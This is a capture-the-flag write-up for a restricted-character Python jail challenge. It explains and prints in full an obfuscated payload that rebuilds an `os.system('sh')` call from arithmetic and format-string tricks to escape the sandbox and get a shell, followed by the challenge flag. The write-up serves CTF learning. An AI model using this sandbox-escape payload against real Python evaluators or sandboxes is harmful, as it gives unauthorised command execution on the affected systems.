# Bee punctual [MISC]

Pyjail with limited character set. 

Constructs the sting `"().__class__.__mro__[1].__subclasses__()[122].load_module("os").system("sh")"` by using `[]==[]` to get access to integer types, `%e` in format strings to get acces to the string `"nan"` using scientific notation, then using the `%a` format specifier on a fucntion to get access to the `%c` format specifier, which then allows it to create an arbitrary string using `%c` and numbers.

Send the following to the server to get a shell:
```py
(_:=[]==[],e_:=_+_,_e:=e_*e_,e__:=_e*e_,_e_:=e__*e_,__e:=_e_*e_,ee_:=__e*e_,_ee:=(e_/_)**(_e_*__e),(("%"+("%e"%(((_ee)*(_ee)+(_ee))/((_ee)*(_ee))))[_])%e),(("%"+((("%"+("%e"%(((_ee)*(_ee)+(_ee))/((_ee)*(_ee))))[_])%e))[_e])*(ee_+_e+e__))%((e__+__e,_+e__+__e,e_+_e+e__+__e,_+e_+_e+e__+_e_+ee_,_+e_+_e+e__+_e_+ee_,_+e_+__e+ee_,_e+e__+__e+ee_,_+__e+ee_,_+e_+_e_+__e+ee_,_+e_+_e_+__e+ee_,_+e_+_e+e__+_e_+ee_,_+e_+_e+e__+_e_+ee_,e_+_e+e__+__e,_+e_+_e+e__+_e_+ee_,_+e_+_e+e__+_e_+ee_,_+_e+e__+__e+ee_,e_+_e_+__e+ee_,_+e_+_e+e__+__e+ee_,_+e_+_e+e__+_e_+ee_,_+e_+_e+e__+_e_+ee_,_+e_+e__+_e_+ee_,_+_e_+__e,_+_e+e__+_e_+ee_,e_+_e+e__+__e,_+e_+_e+e__+_e_+ee_,_+e_+_e+e__+_e_+ee_,_+e_+_e_+__e+ee_,_+_e+_e_+__e+ee_,e_+__e+ee_,_+e_+__e+ee_,_e+e__+__e+ee_,_+__e+ee_,_+e_+_e_+__e+ee_,_+e_+_e_+__e+ee_,_+_e+__e+ee_,_+e_+_e_+__e+ee_,_+e_+_e+e__+_e_+ee_,_+e_+_e+e__+_e_+ee_,e__+__e,_+e__+__e,_+e_+e__+_e_+ee_,_+_e_+__e,e_+_e_+__e,e_+_e_+__e,_+_e+e__+_e_+ee_,e_+_e+e__+__e,_e+e__+__e+ee_,_+e_+_e+e__+__e+ee_,_+__e+ee_,_e+__e+ee_,_+e_+_e+e__+_e_+ee_,_+_e+e__+__e+ee_,_+e_+_e+e__+__e+ee_,_e+__e+ee_,_+_e+_e_+__e+ee_,_e+e__+__e+ee_,_+_e+__e+ee_,e__+__e,e_+__e,_+e_+_e+e__+__e+ee_,_+e_+_e_+__e+ee_,e_+__e,_+e__+__e,e_+_e+e__+__e,_+e_+_e_+__e+ee_,_+e__+_e_+__e+ee_,_+e_+_e_+__e+ee_,_e+_e_+__e+ee_,_+_e+__e+ee_,_+_e+e__+__e+ee_,e__+__e,e_+__e,_+e_+_e_+__e+ee_,e__+__e+ee_,e_+__e,_+e__+__e)))[-_]
```

**FLAG: SCC{I_wanted_to_put_the_bee_movie_script_in_the_flag_but_they_wouldnt_let_me}**
